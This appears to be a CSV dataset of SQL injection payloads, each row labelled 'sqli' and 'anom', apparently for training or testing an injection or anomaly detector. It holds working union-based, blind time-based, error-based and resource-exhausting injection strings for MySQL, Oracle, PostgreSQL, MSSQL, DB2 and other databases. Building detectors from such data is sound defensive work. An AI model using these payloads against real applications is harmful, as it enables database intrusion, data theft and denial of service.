"payload","length","attack_type","label"
"-7580')) as mmqt where 3468=3468 union all select 3468,3468,3468,3468,3468,3468#","80","sqli","anom"
"-7532))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((8332=8332","223","sqli","anom"
"1'||(select 'lmsc' from dual where 1162=1162 order by 1--","57","sqli","anom"
"-2718"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""xwbf""=""xwbf","203","sqli","anom"
"1) union all select null,null,null,null,null,null#","50","sqli","anom"
"1)) union all select null,null,null,null,null,null--","52","sqli","anom"
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--","69","sqli","anom"
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#","58","sqli","anom"
"1%"")));select (case when (3855=3855) then 3855 else 1/(select 0) end)--","71","sqli","anom"
"1%')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('%'='","216","sqli","anom"
"1%'))) and make_set(8403=8403,8899) and ((('%'='","48","sqli","anom"
"1"" or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","104","sqli","anom"
"-3211)) as fsej where 6348=6348 or 9805=3783--","46","sqli","anom"
"1"" where 5333=5333 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","126","sqli","anom"
"1') as qaec where 6572=6572 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","179","sqli","anom"
"1%');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('%'='","81","sqli","anom"
"1%"")) or 8514=benchmark(5000000,md5(0x544d5a4c))#","49","sqli","anom"
"1'+(select 'vedi' where 2774=2774 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","132","sqli","anom"
"1',(select (case when (6948=4654) then 1 else 6948*(select 6948 from mysql.db) end))","84","sqli","anom"
"-7187' or 4159=7465","19","sqli","anom"
"-1076 union all select 3959,3959--","34","sqli","anom"
"-5963"" or 9323=9323#","20","sqli","anom"
"-5258) or (8459=8459)*4906","26","sqli","anom"
"1"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""kvpy""=""kvpy","126","sqli","anom"
"1') where 9544=9544 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--","123","sqli","anom"
"1' in boolean mode) union all select null,null,null,null,null,null,null,null--","78","sqli","anom"
"1"" where 9135=9135 and elt(4249=4249,7259)--","44","sqli","anom"
"1))) and 9575=1640--","20","sqli","anom"
"1))) and elt(3132=1541,1541) and (((4258=4258","45","sqli","anom"
"1'||(select 'oxam' from dual where 7162=7162 and make_set(8403=8403,8899))||'","77","sqli","anom"
"-7744""))) union all select 9408,9408,9408,9408--","48","sqli","anom"
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","94","sqli","anom"
"1') where 8118=8118;select benchmark(5000000,md5(0x714e4153))#","62","sqli","anom"
"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""jmjr"" like ""jmjr","186","sqli","anom"
"1%')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('%'='","216","sqli","anom"
"1%' and 9127=7687--","19","sqli","anom"
"1"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""mhfc""=""mhfc","110","sqli","anom"
"1%""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""%""=""","79","sqli","anom"
"1%""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","158","sqli","anom"
"-2803"") union all select 5337,5337,5337,5337,5337,5337,5337#","60","sqli","anom"
"1'))) and sleep(5) and ((('lbmp'='lbmp","38","sqli","anom"
"-8655) where 3910=3910 union all select 3910,3910#","50","sqli","anom"
"1');select benchmark(5000000,md5(0x4c4d6142)) and ('nslo' like 'nslo","68","sqli","anom"
"1')) as rxhe where 3838=3838 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","130","sqli","anom"
"1')) as agdn where 8442=8442 and 3824=benchmark(5000000,md5(0x76555642))--","74","sqli","anom"
"-2296"" union all select 7359,7359,7359,7359,7359,7359#","54","sqli","anom"
"1'+(select qtyi where 7147=7147;select count(*) from generate_series(1,5000000)--","81","sqli","anom"
"-5769) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')","99","sqli","anom"
"1';if(7899=7899) select 7899 else drop function zbbp--","54","sqli","anom"
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('bvdw'='bvdw","211","sqli","anom"
"1 where 6040=6040 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","116","sqli","anom"
"1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('dpdz' like 'dpdz","225","sqli","anom"
"1') and elt(1407=6365,6365) and ('zckl'='zckl","45","sqli","anom"
"-2276"")) as qwow where 2321=2321 or 3534=2971--","47","sqli","anom"
"-6639') as trll where 6271=6271 union all select 6271,6271,6271#","64","sqli","anom"
"1"" where 3227=3227 waitfor delay '0:0:5'--","42","sqli","anom"
"1"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""ozvp""=""ozvp","112","sqli","anom"
"1')) and elt(1210=1210,sleep(5)) and (('ogpg'='ogpg","51","sqli","anom"
"1) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","104","sqli","anom"
"1"") and 9198=9198--","19","sqli","anom"
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg","98","sqli","anom"
"-2761 or 1144=7657-- mfml","25","sqli","anom"
"1"") and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","144","sqli","anom"
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd","110","sqli","anom"
"1 where 3478=3478 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--","217","sqli","anom"
"1%')) or (select * from (select(sleep(5)))sddo)#","48","sqli","anom"
"1',(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--","211","sqli","anom"
"1%' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='","153","sqli","anom"
"1' rlike (select (case when (5384=7060) then 1 else 0x28 end))","62","sqli","anom"
"1"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","87","sqli","anom"
"-8924)) as jybr where 7901=7901 or elt(1032=1032,3623)--","56","sqli","anom"
"1) and (3020=3020)*6703","23","sqli","anom"
"1 rlike sleep(5)# urxh","22","sqli","anom"
"1%')));select (case when (5752=6036) then 1 else 5752*(select 5752 from master..sysdatabases) end)--","100","sqli","anom"
"1' and 9970=3409","16","sqli","anom"
"1""));select (case when (3499=4209) then 3499 else 3499*(select 3499 from mysql.db) end)#","88","sqli","anom"
"1'+(select rdwb where 2498=2498 and 3429=7639--","47","sqli","anom"
"1'+(select zwsr where 6567=6567;select pg_sleep(5))+'","53","sqli","anom"
"-7796') union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#","75","sqli","anom"
"-6970"")) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""dyrq"" like ""dyrq","227","sqli","anom"
"1) as kjsd where 1670=1670 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","124","sqli","anom"
"1"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""uvvy"" like ""uvvy","130","sqli","anom"
"1) where 5261=5261 and elt(1210=1210,sleep(5))--","48","sqli","anom"
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('yaml'='yaml","122","sqli","anom"
"1"")) and 7533=7533 and ((""rnni"" like ""rnni","42","sqli","anom"
"1""));iif(8770=9611,1,1/0)","25","sqli","anom"
"1%"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""%""=""","104","sqli","anom"
"1) as cfnz where 6065=6065 union all select null,null,null,null,null,null,null,null,null#","89","sqli","anom"
"-6122'))) or 9243=6161--","24","sqli","anom"
"1%"")(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (""%""=""","212","sqli","anom"
"1 where 4968=4968 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--","110","sqli","anom"
"-5606) union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#","69","sqli","anom"
"1 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)-- btqa","99","sqli","anom"
"1'||(select 'ywjy' where 7579=7579;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","135","sqli","anom"
"-3228"") or (5901=1570)*1570 and (""egdd""=""egdd","45","sqli","anom"
"1) rlike sleep(5)#","18","sqli","anom"
"1%' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='","74","sqli","anom"
"1)) as qgok where 3993=3993 and 3824=benchmark(5000000,md5(0x76555642))--","73","sqli","anom"
"1%""))) and 7533=7533 and (((""%""=""","33","sqli","anom"
"1)) and make_set(8403=8403,8899) and ((4686=4686","48","sqli","anom"
"1'+(select uqdb where 3508=3508 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","126","sqli","anom"
"1%')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='","78","sqli","anom"
"-3566%' or 2158=6289","20","sqli","anom"
"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""bxcb"" like ""bxcb","224","sqli","anom"
"1"")) and 6969=(select 6969 from pg_sleep(5)) and ((""nepk""=""nepk","63","sqli","anom"
"1%""))) union all select null#","29","sqli","anom"
"-9405' union all select 2539--","30","sqli","anom"
"1%"";select sleep(5)#","20","sqli","anom"
"-8791""))) or make_set(6681=6620,6620) and (((""pvdk""=""pvdk","57","sqli","anom"
"-1988 where 4597=4597 union all select 4597,4597,4597,4597,4597,4597--","70","sqli","anom"
"1"") as nyui where 2511=2511;iif(5257=5257,1,1/0)","48","sqli","anom"
"1%"") or sleep(5)#","17","sqli","anom"
"-3626%"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""%""=""","205","sqli","anom"
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and 'ulep'='ulep","122","sqli","anom"
"1');select like('abcdefg',upper(hex(randomblob(500000000/2))))","62","sqli","anom"
"1'||(select 'cqjw' from dual where 7335=7335 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'","142","sqli","anom"
"1');select case when 7717=7717 then 1 else null end--","53","sqli","anom"
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)","103","sqli","anom"
"-3954')) union all select 2417,2417--","37","sqli","anom"
"1"" rlike (select * from (select(sleep(5)))sgvo) and ""wcze""=""wcze","64","sqli","anom"
"-5910%'))) union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--","79","sqli","anom"
"1' where 9544=9544;(select * from (select(sleep(5)))acdk)#","58","sqli","anom"
"-8112'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('xopg'='xopg","215","sqli","anom"
"1')) as qwdh where 7581=7581 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","170","sqli","anom"
"1%""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""%""=""","63","sqli","anom"
"1%') or elt(5873=5873,sleep(5))#","32","sqli","anom"
"1)) as uadn where 9588=9588 rlike sleep(5)#","43","sqli","anom"
"1""))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((""tzqk"" like ""tzqk","121","sqli","anom"
"1')) or 6793=(select 6793 from pg_sleep(5)) and (('qiau'='qiau","62","sqli","anom"
"1'+(select xzvf where 9727=9727;(select * from (select(sleep(5)))acdk)#","71","sqli","anom"
"1"" or sleep(5) and ""telb""=""telb","31","sqli","anom"
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3","92","sqli","anom"
"1"")) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""lano""=""lano","119","sqli","anom"
"1'||(select 'ttyt' where 3751=3751 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","136","sqli","anom"
"1"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""uzbl""=""uzbl","129","sqli","anom"
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'rpiz' like 'rpiz","85","sqli","anom"
"1"") where 3390=3390;call regexp_substring(repeat(right(char(3702),0),500000000),null)--","87","sqli","anom"
"1%"";select (case when (3855=3855) then 3855 else 1/(select 0) end)--","68","sqli","anom"
"1%';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'='","103","sqli","anom"
"1%') or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","80","sqli","anom"
"1'+(select ijck where 9961=9961 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'","189","sqli","anom"
"-3044') or 4999=3051#","21","sqli","anom"
"1 where 5401=5401 and elt(1210=1210,sleep(5))--","47","sqli","anom"
"1')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('jutx'='jutx","108","sqli","anom"
"1 and (select * from (select(sleep(5)))fzno)# bkjl","50","sqli","anom"
"1) as amgf where 4308=4308 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--","136","sqli","anom"
"-2896')) as wisk where 1030=1030 union all select 1030,1030,1030,1030#","70","sqli","anom"
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- ztzu","148","sqli","anom"
"1 where 6036=6036 and 7533=7533--","33","sqli","anom"
"-9445) as dmur where 4371=4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#","98","sqli","anom"
"1%"")));select case when 7717=7717 then 1 else null end--","56","sqli","anom"
"1)) as wwys where 9248=9248;(select * from (select(sleep(5)))srmq)--","68","sqli","anom"
"1'||(select 'kitk' where 6311=6311;select * from generate_series(8147,8147,case when (8147=6336) then 1 else 0 end) limit 1--","125","sqli","anom"
"1%')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('%'='","187","sqli","anom"
"1%'));select (case when (7594=8086) then 7594 else 1/(select 0) end)--","70","sqli","anom"
"1')) rlike (select (case when (8489=8820) then 1 else 0x28 end)) and (('fbjf'='fbjf","83","sqli","anom"
"-9810') where 4361=4361 or elt(1032=1032,3623)--","48","sqli","anom"
"1'||(select 'xuof' from dual where 8794=8794 or 8156=(select count(*) from generate_series(1,5000000))--","104","sqli","anom"
"1'+(select 'zkum' where 5161=5161 union all select null,null,null,null#","71","sqli","anom"
"1' and 2006=2006","16","sqli","anom"
"(select (case when (6986=6986) then 6986 else 6986*(select 6986 from mysql.db) end))","84","sqli","anom"
"1) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (3530=3530","249","sqli","anom"
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('vwxg'='vwxg","124","sqli","anom"
"select 'qqpjq'||(select (case when (2933=2933) then 1 else 0 end))||'qzvzq'","75","sqli","anom"
"1"" where 7696=7696 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--","252","sqli","anom"
"1 where 6523=6523 and 8594=(select 8594 from pg_sleep(5))--","59","sqli","anom"
"1')) as jmnw where 6496=6496 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","180","sqli","anom"
"1) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (9841=9841","168","sqli","anom"
"1"")) rlike (select * from (select(sleep(5)))sgvo) and ((""grct""=""grct","68","sqli","anom"
"-2601') union all select 2866,2866,2866,2866,2866,2866--","56","sqli","anom"
"1'||(select 'jlka' where 5436=5436 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","129","sqli","anom"
"1%'))) and (select * from (select(sleep(5)))gcrr)#","50","sqli","anom"
"-1366' or make_set(9354=9354,7185) and 'abre'='abre","51","sqli","anom"
"-3452%' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'='","212","sqli","anom"
"1' in boolean mode) order by 1#","31","sqli","anom"
"1%"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""%""=""","214","sqli","anom"
"1'||(select 'qtep' where 2572=2572 or (select * from (select(sleep(5)))sddo)#","77","sqli","anom"
"1%')) or 8156=(select count(*) from generate_series(1,5000000))--","65","sqli","anom"
"-4807' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'wwki'='wwki","218","sqli","anom"
"1 rlike (select * from (select(sleep(5)))vwyq)#","47","sqli","anom"
"1"") and 2954=1256--","19","sqli","anom"
"1%"" and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","106","sqli","anom"
"1'+(select 'qaar' where 7841=7841 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'","132","sqli","anom"
"1%'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('%'='","116","sqli","anom"
"1%';select like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='","72","sqli","anom"
"1)) as syot where 1199=1199;waitfor delay '0:0:5'--","51","sqli","anom"
"1%'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--","70","sqli","anom"
"1'+(select 'jkgf' where 7487=7487;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","118","sqli","anom"
"1"" where 2035=2035 and 3824=benchmark(5000000,md5(0x76555642))--","64","sqli","anom"
"1%')));begin user_lock.sleep(5); end--","38","sqli","anom"
"1%') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('%'='","216","sqli","anom"
"1'||(select 'zeet' from dual where 9567=9567 and 8594=(select 8594 from pg_sleep(5))--","86","sqli","anom"
"1) as guru where 7615=7615 union all select null,null,null,null,null,null,null,null,null,null#","94","sqli","anom"
"1%"" and 2805=1345","17","sqli","anom"
"1' in boolean mode) or 8514=benchmark(5000000,md5(0x544d5a4c))#","63","sqli","anom"
"1') and 6969=(select 6969 from pg_sleep(5)) and ('nqol'='nqol","61","sqli","anom"
"1 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","204","sqli","anom"
"1));call regexp_substring(repeat(right(char(2385),0),500000000),null)--","71","sqli","anom"
"1""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""sdvu"" like ""sdvu","133","sqli","anom"
"1%';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and '%'='","128","sqli","anom"
"1'))) rlike sleep(5)#","21","sqli","anom"
"1%';select like('abcdefg',upper(hex(randomblob(500000000/2))))--","64","sqli","anom"
"1') and (3020=3020)*6703 and ('rskq'='rskq","42","sqli","anom"
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('wqme'='wqme","153","sqli","anom"
"1%""))) union all select null,null,null,null--","45","sqli","anom"
"1"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""iuxs"" like ""iuxs","71","sqli","anom"
"1"")) as lfte where 3811=3811 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--","132","sqli","anom"
"1%""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""%""=""","116","sqli","anom"
"1 where 8114=8114 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","170","sqli","anom"
"-2204'||(select 'bwae' from dual where 4884=4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#","116","sqli","anom"
"1%"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""%""=""","58","sqli","anom"
"1%"");begin dbms_lock.sleep(5); end and (""%""=""","45","sqli","anom"
"-1598"")) or elt(5329=9628,9628) and ((""hyxq"" like ""hyxq","55","sqli","anom"
"1'))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","113","sqli","anom"
"1')) as xirr where 2425=2425;select sleep(5)#","45","sqli","anom"
"-4904') as ogyu where 2821=2821 or 5982=1643","44","sqli","anom"
"1"";begin user_lock.sleep(5); end--","34","sqli","anom"
"1%"")) order by 1--","18","sqli","anom"
"1 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","142","sqli","anom"
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2))))--","66","sqli","anom"
"1'+(select ummn where 8883=8883 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+'","230","sqli","anom"
"-3649"")) as eydu where 3220=3220 or elt(8705=1510,1510)--","57","sqli","anom"
"-4615' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))","204","sqli","anom"
"1',(select (case when (5154=5154) then 1 else 5154*(select 5154 from master..sysdatabases) end))","96","sqli","anom"
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('asdc' like 'asdc","158","sqli","anom"
"1) where 8474=8474 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","170","sqli","anom"
"1' where 6795=6795 and 8635=(select count(*) from generate_series(1,5000000))--","79","sqli","anom"
"1%"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""%""=""","113","sqli","anom"
"1));if(2643=1393) select 2643 else drop function nqss--","55","sqli","anom"
"1) where 1487=1487;begin dbms_lock.sleep(5); end--","50","sqli","anom"
"1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('smrw' like 'smrw","229","sqli","anom"
"1' in boolean mode) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)#","221","sqli","anom"
"1%"") and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","80","sqli","anom"
"1"") where 5938=5938 and (select * from (select(sleep(5)))gcrr)#","63","sqli","anom"
"1')) as hxxm where 3792=3792 and sleep(5)#","42","sqli","anom"
"1)) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((6010=6010","94","sqli","anom"
"-9700') or 8811=7862","20","sqli","anom"
"1%'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('%'='","115","sqli","anom"
"-9429') order by 1--","20","sqli","anom"
"1"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""pmmr""=""pmmr","173","sqli","anom"
